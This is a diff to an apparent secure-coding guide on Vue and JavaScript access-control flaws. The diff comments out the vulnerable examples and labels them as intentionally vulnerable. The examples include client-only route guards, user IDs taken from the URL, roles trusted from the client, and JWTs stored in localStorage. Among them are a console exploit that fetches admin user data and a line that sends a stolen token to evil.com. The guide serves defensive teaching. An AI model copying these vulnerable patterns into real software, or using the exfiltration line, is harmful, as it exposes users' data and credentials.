@@ -12,6 +12,8 @@ Severity: **Critical**
 
 ### Vulnerable Pattern
 ```js
+// SECURITY EXAMPLE — intentionally vulnerable / DO NOT USE
+/*
 // ❌ This prevents navigation — NOT data access
 router.beforeEach((to, from, next) => {
   const auth = useAuthStore()
@@ -25,13 +27,17 @@ router.beforeEach((to, from, next) => {
 // ❌ The admin view calls this unprotected endpoint
 await axios.delete('/api/users/42')  // no server auth check
 await axios.get('/api/admin/export') // full user dump
+*/
 ```
 
 ### Exploit
 Open DevTools → Console:
 ```js
+// SECURITY EXAMPLE — intentionally vulnerable / DO NOT USE
+/*
 fetch('/api/admin/users').then(r=>r.json()).then(console.log)
 // If data comes back as a student, access control is broken
+*/
 ```
 
 ### Secure Pattern
@@ -68,6 +74,8 @@ A learning platform has an admin dashboard at `/admin/users`. A student discover
 
 ### Vulnerable Pattern
 ```js
+// SECURITY EXAMPLE — intentionally vulnerable / DO NOT USE
+/*
 // ❌ User ID from URL — attacker iterates
 const route = useRoute()
 const { data } = await axios.get(`/api/users/${route.params.id}/grades`)
@@ -77,6 +85,7 @@ const { data } = await axios.get(`/api/users/${route.params.id}/grades`)
 const downloadCert = (userId) => {
   window.location = `/api/certificates/${userId}.pdf`
 }
+*/
 ```
 
 ### Secure Pattern
@@ -96,6 +105,8 @@ app.get('/api/users/:id/grades', auth, (req, res) => {
 
 ### Vulnerable Pattern
 ```js
+// SECURITY EXAMPLE — intentionally vulnerable / DO NOT USE
+/*
 // ❌ Role in Pinia state — editable via Vue Devtools
 export const useAuthStore = defineStore('auth', {
   state: () => ({
@@ -112,6 +123,7 @@ axios.post('/api/courses', {
   title: 'My Course',
   createdBy: authStore.user.role // attacker sends 'admin'
 })
+*/
 ```
 
 ### Secure Pattern
@@ -123,6 +135,8 @@ Never trust client-sent roles. Extract the role from the server-verified JWT. Fo
 
 ### Vulnerable Pattern
 ```js
+// SECURITY EXAMPLE — intentionally vulnerable / DO NOT USE
+/*
 // ❌ Any XSS payload reads this instantly
 localStorage.setItem('access_token', jwt) // 30-day expiry
 
@@ -132,6 +146,7 @@ fetch('https://evil.com?t=' + localStorage.getItem('token'))
 // ❌ "Encrypted" localStorage is security theater
 // The encryption key is also in the JS — extractable
 localStorage.setItem('token', CryptoJS.AES.encrypt(jwt, 'key123'))
+*/
 ```
 
 ### Exploit Chain
